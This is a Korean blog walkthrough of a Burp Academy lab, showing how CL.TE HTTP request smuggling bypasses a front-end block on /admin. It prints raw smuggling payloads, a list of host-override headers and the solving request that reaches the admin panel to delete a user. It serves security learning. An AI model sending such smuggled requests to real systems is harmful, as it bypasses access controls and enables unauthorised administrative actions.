---
layout: post
title: "Burp Academy-HTTP Request Smuggling 관련 취약점: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability"
categories: [보안취약점, Burp Academy]
tags: [보안취약점, Burp Academy, HTTP Request Smuggling]
toc: true
last_modified_at: 2024-01-17 21:00:00 +0900
---

# 개요
- HTTP Request Smuggling 취약점 문제이다. 
- 문제 주소: https://portswigger.net/web-security/request-smuggling/exploiting/lab-bypass-front-end-controls-cl-te
- 취약점 설명페이지1: https://portswigger.net/web-security/request-smuggling
- 취약점 설명페이지2: https://portswigger.net/web-security/request-smuggling/exploiting
- 난이도: PRACTITIONER (보통)

# 취약점 개요 - bypass front-end security controls
- Burp Academy 에서는 HTTP Request Smuggling을 탐지하는 단계를 세 단계로 나눠서 가르치고 있다. 
- Indentifying과 Confirming, Exploiting이 그 것이다. 
- Indentifying은 식별, Confirming은 확신정도로 이해하면 되겠다. Exploiting은 취약점을 악용하는 단계다.
- 이 문제부터는 Exploiting에 해당한다.  
- Exploiting 중에서 프론트 엔드 서버에서만 접근 제어를 하는 경우를 생각할 수 있다. (백엔드 서버는 아무런 체크 없이 프론트엔드 서버를 믿고 프론트엔드 서버로 부터 받은 HTTP요청을 처리한다.)
- 프론트 엔드 서버만 잘 속이면 특정 권한만 접근할 수 있는 곳, 예를들면 관리자 기능에 접근하는 요청을 스머글링해서 접근제어를 우회할 수 있다. 
- 예를 들면 다음과 같은 경우다. CL.TE 타입의 스머글링이 가능하다면 관리자 기능에 접근할 수 있다. 

```http
POST /home HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: vulnerable-website.com
Foo: xGET /home HTTP/1.1
Host: vulnerable-website.com
```

# 랩 개요
- 이 랩은 프론트 엔드 서버와 백엔드 서버로 구성되어 있다. 프론트 엔드서버는 chunked encoding(TE헤더)를 지원하지 않는다. 
- 프론트엔드서버는 관리자가 아닌경우 `/admin`에 접근하지 못하게 하는 접근 제어를 실시중이다.
- 랩을 풀려면 백엔드 서버에게 HTTP요청을 밀반입해서, 관리자 패널(`/admin`)에 접근해 carlos 유저를 삭제하면 된다. 

```
This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.

To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos.
```

# 도전
1. 다음 페이로드로 스머글링이 되는 것을 확인했다. 다만 `HTTP/1.1 401 Unauthorized`응답이 돌아왔다. 페이지에는 `Admin interface only available to local users`가 쓰여있었다. 

![스머글링 가능 확인](/images/burp-academy-hrs-6-1.png)

2. Host헤더에 localhost를 지정하면 접근할 수 있을 것 같다. 그런데 스머글링할 요청에 Host헤더가 있으면 중복 헤더는 허용하지 않는다는 메세지가 돌아왔다. 

![Host헤더가 있으면 에러](/images/burp-academy-hrs-6-2.png)

3. 호스트헤더 인젝션 취약점에서 배웠던 Host헤더와 비슷한 역할을 하는 다양한 다른 헤더를 시도해봤지만 여전히 401응답이었다. 

```
X-Forwarded-Host: 127.0.0.1
Referer: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Server: 127.0.0.1
X-HTTP-Host-Override: 127.0.0.1
Forwarded: 127.0.0.1
X-Forwarded-For: 127.0.0.1
```

![Host헤더 헷갈리게 하기 공격](/images/burp-academy-hrs-6-3.png)

4. 음... Host 헤더의 앞 뒤에 `\r` 이나 `\0` 등을 넣어서도 해봤지만 안된다. 답을 본다. 

5. 답을 보니 다음과 같이 스머글링 요청에 **Content-Length 헤더와 바디부분이 있는 경우**는 접근이 가능한 것을 알 수 있었다. (CL헤더 값이 0일 때는 안 동작한다.) 그런데 왜 동작하지는지는 모르겠다... CL헤더와 바디값이 추가된 것이 어떤 차이를 만들어낸 걸까?

```http
POST / HTTP/1.1
Host: 0a9100540483340d858b121a00730099.web-security-academy.net
Cookie: session=Nj2JXsk6Y8Nzr8JMd2z0N18bLRglPmDs
Content-Type: application/x-www-form-urlencoded
Content-Length: 65
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Length: 5

x
```

![답을 보고 스머글링](/images/burp-academy-hrs-6-4.png)

6. 아.. 이유를 알 것 같다. Host헤더의 중복여부를 판별하는 것은 백엔드 서버일 것이다. 

백엔드 서버에서 보면 처리하는 요청이 첫번째 경우(공격 실패한 경우)는 이렇게 생겼을 것이다. (두번째 요청의 POST 부분이 합쳐져서 처리된다.) Host헤더가 두 개있으므로 중복되므로 백엔드 서버는 처리를 거부한다. 

```http
GET /admin HTTP/1.1
Host: localhostPOST / HTTP/1.1
Host: 0a9100540483340d858b121a00730099.web-security-academy.net
Cookie: session=Nj2JXsk6Y8Nzr8JMd2z0N18bLRglPmDs
...
```

성공하는 경우는 이렇게 생겼을 것이다. 스머글링 요청에 CL헤더와 바디부분이 있음으로 해서 POST 이후 부분이 HTTP요청의 바디로 처리된 것이다! 😲 Host헤더가 하나만 있으므로 백엔드 서버에서 정상적으로 처리된다. 

```http
GET /admin HTTP/1.1
Host: localhost
Content-Length: 5

POST / HTTP/1.1
Host: 0a9100540483340d858b121a00730099.web-security-academy.net
Cookie: session=Nj2JXsk6Y8Nzr8JMd2z0N18bLRglPmDs
...
```

7. carlos유저 삭제 요청(`/admin/delete?username=carlos`)을 스머글링요청에 지정해서 보내본다. 두번보내면 302응답(정상처리)을 확인할 수 있다. 

![carlos유저 삭제 요청](/images/burp-academy-hrs-6-5.png)

8. 풀이에 성공했다. 

![풀이 성공](/images/burp-academy-hrs-6-success.png)